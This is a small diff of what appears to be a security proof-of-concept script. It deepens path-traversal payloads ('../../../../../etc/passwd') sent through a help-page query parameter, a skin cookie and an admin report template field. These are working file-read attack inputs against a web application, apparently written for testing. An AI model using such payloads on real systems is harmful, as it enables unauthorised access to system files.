@@ -225,13 +225,13 @@ def poc_0003() -> None:
 
 def poc_0004() -> None:
     """A help article that resolves outside the article folder."""
-    anon.get(raw_query("/help.php", "topic=" + q("../../../../etc/passwd")))
+    anon.get(raw_query("/help.php", "topic=" + q("../../../../../etc/passwd")))
 
 
 def poc_0005() -> None:
     """The masthead fragment, named in a cookie nothing links to."""
     client = fresh()
-    client.get("/", headers={"Cookie": "bt_skin=../../../../etc/passwd"})
+    client.get("/", headers={"Cookie": "bt_skin=../../../../../etc/passwd"})
 
 
 def poc_0006() -> None:
@@ -396,7 +396,7 @@ def poc_0027() -> None:
 
 def poc_0028() -> None:
     """A report template that resolves outside the report folder."""
-    staff.post("/admin/reports.php", {"template": "../../../../etc/passwd", "period": "2026-01"})
+    staff.post("/admin/reports.php", {"template": "../../../../../etc/passwd", "period": "2026-01"})
 
 
 POCS = [
